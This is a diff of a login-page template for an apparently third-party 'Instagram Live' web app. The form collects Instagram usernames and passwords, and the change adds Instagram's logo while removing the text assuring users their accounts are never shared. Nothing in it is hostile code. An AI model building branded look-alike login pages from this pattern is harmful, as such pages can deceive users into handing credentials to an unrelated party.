@@ -12,32 +12,32 @@
       </div>
       {% endfor %}{% endif %}{% endwith %}
       <div class="card">
-        <div class="card-body">
+        <div class="card-body text-center">
+          <img
+            src="{{ url_for('static', filename='img/instagram_text_logo.png') }}
+          "
+            alt="instagram logo"
+            width="250"
+          />
           <h5 class="card-title text-center mb-4">Instagram Live</h5>
-          <p class="card-subtitle mb-4 text-muted">
-            Please log in to your instagram account.
-          </p>
           <form action="/login" method="post">
             <div class="form-group">
-              <label for="inputUsername">Username</label>
               <input
                 type="text"
                 class="form-control"
                 id="inputUsername"
                 name="username"
+                placeholder="Username"
               />
             </div>
             <div class="form-group">
-              <label for="inputPassword">Password</label>
               <input
                 type="password"
                 class="form-control"
                 id="inputPassword"
                 name="password"
+                placeholder="Password"
               />
-              <small id="emailHelp" class="form-text text-muted"
-                >We'll never share your accounts with anyone else.</small
-              >
             </div>
             <button type="submit" class="btn btn-primary btn-block">
               Login
